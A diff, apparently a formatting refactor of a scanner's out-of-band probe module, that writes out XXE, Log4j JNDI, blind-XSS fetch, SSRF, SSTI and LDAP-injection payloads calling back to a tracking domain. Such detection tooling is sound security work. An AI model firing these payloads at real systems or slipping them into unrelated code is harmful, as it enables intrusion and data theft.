@@ -13,7 +13,7 @@ can pinpoint exactly which probe caused it.
 from __future__ import annotations
 
 import secrets
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from typing import Iterable
 
 __all__ = [
@@ -29,18 +29,18 @@ OOB_PAYLOAD_KINDS: tuple[str, ...] = (
     "ssrf-http",
     "ssrf-https",
     "ssrf-dns",
-    "ssrf-gopher",      # gopher://{domain}/_
-    "ssrf-fileproto",   # file:// — separate kind, mostly for log-scanning
-    "xxe-system",       # <!ENTITY foo SYSTEM "http://{domain}/xxe">
-    "xxe-param",        # parameter entity
-    "log4j-jndi",       # ${jndi:ldap://{domain}/...}
-    "log4j-jndi-dns",   # ${jndi:dns://{domain}/...}
-    "blind-xss-img",    # <img src=x onerror=fetch('https://{domain}/xss')>
-    "blind-xss-script", # <script>fetch('https://{domain}/...')</script>
-    "blind-xss-svg",    # <svg/onload=fetch('https://{domain}/...')>
-    "ssti-jinja",       # {{ "".__class__.__mro__[2].__subclasses__()... }} — DNS-only
-    "ldap-injection",   # *)(&(|(uid={domain})))
-    "smtp-injection",   # CRLF injection landing on smtp lookup
+    "ssrf-gopher",  # gopher://{domain}/_
+    "ssrf-fileproto",  # file:// — separate kind, mostly for log-scanning
+    "xxe-system",  # <!ENTITY foo SYSTEM "http://{domain}/xxe">
+    "xxe-param",  # parameter entity
+    "log4j-jndi",  # ${jndi:ldap://{domain}/...}
+    "log4j-jndi-dns",  # ${jndi:dns://{domain}/...}
+    "blind-xss-img",  # <img src=x onerror=fetch('https://{domain}/xss')>
+    "blind-xss-script",  # <script>fetch('https://{domain}/...')</script>
+    "blind-xss-svg",  # <svg/onload=fetch('https://{domain}/...')>
+    "ssti-jinja",  # {{ "".__class__.__mro__[2].__subclasses__()... }} — DNS-only
+    "ldap-injection",  # *)(&(|(uid={domain})))
+    "smtp-injection",  # CRLF injection landing on smtp lookup
 )
 
 
@@ -83,36 +83,25 @@ def _payload_for(kind: str, subdomain: str) -> str:
     if kind == "ssrf-fileproto":
         return f"file:///{full}"
     if kind == "xxe-system":
-        return (
-            f'<?xml version="1.0"?>'
-            f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{full}/xxe">]>'
-            f'<root>&xxe;</root>'
-        )
+        return f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{full}/xxe">]><root>&xxe;</root>'
     if kind == "xxe-param":
-        return (
-            f'<?xml version="1.0"?>'
-            f'<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{full}/xxep"> %xxe;]>'
-            f'<root>x</root>'
-        )
+        return f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{full}/xxep"> %xxe;]><root>x</root>'
     if kind == "log4j-jndi":
         return f"${{jndi:ldap://{full}/log4j}}"
     if kind == "log4j-jndi-dns":
         return f"${{jndi:dns://{full}/log4jdns}}"
     if kind == "blind-xss-img":
-        return f'<img src=x onerror="fetch(\'https://{full}/xssimg\')">'
+        return f"<img src=x onerror=\"fetch('https://{full}/xssimg')\">"
     if kind == "blind-xss-script":
         return f'<script>fetch("https://{full}/xssjs")</script>'
     if kind == "blind-xss-svg":
-        return f'<svg/onload="fetch(\'https://{full}/xsssvg\')">'
+        return f"<svg/onload=\"fetch('https://{full}/xsssvg')\">"
     if kind == "ssti-jinja":
         # Many SSTI sandboxes block direct command output but DO
         # honor http requests via os.system(curl ...) when the
         # template environment isn't locked down. We use the
         # DNS-only form to keep the payload small + observable.
-        return (
-            "{{ ''.__class__.__mro__[1].__subclasses__() }}"
-            f"<!-- {full} -->"
-        )
+        return f"{{{{ ''.__class__.__mro__[1].__subclasses__() }}}}<!-- {full} -->"
     if kind == "ldap-injection":
         return f"*)(uid={full}))"
     if kind == "smtp-injection":
